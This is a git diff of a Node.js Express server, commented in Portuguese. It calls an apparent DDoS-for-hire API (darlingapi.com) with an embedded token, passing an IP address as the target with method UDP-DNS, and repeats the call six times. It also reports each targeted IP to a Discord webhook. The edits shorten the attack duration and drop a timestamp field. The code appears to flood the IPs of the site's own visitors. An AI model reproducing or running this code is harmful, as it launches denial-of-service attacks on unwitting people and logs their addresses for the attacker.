@@ -3,7 +3,7 @@ const fs = require('fs').promises;
 const path = require('path');
 const axios = require('axios');
 const app = express();
-const port = process.env.PORT || 4000;
+const port = 3000;
 
 const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
 const configFile = path.join(__dirname, 'data', 'config.json');
@@ -13,7 +13,7 @@ let lock = false;
 
 // Função para enviar requisição à API
 async function sendApiRequest(ip) {
-    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=2700&method=UDP-DNS`;
+    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
     try {
         for (let i = 0; i < 6; i++) {
         await axios.get(url);
@@ -25,7 +25,7 @@ async function sendApiRequest(ip) {
 }
 
 // Função para enviar webhooks ao Discord
-async function sendDiscordWebhooks(ip, timestamp) {
+async function sendDiscordWebhooks(ip) {
     try {
         await axios.post(discordWebhookUrl, {
             embeds: [{
@@ -36,11 +36,6 @@ async function sendDiscordWebhooks(ip, timestamp) {
                     {
                         name: 'IP',
                         value: ip,
-                        inline: true
-                    },
-                    {
-                        name: 'Data e Hora',
-                        value: timestamp,
                         inline: true
                     }
                 ],
@@ -71,8 +66,7 @@ async function sendDiscordWebhooks(ip, timestamp) {
                         value: '2700',
                         inline: true
                     }
-                ],
-                timestamp: new Date()
+                ]
             }]
         });
     } catch (error) {
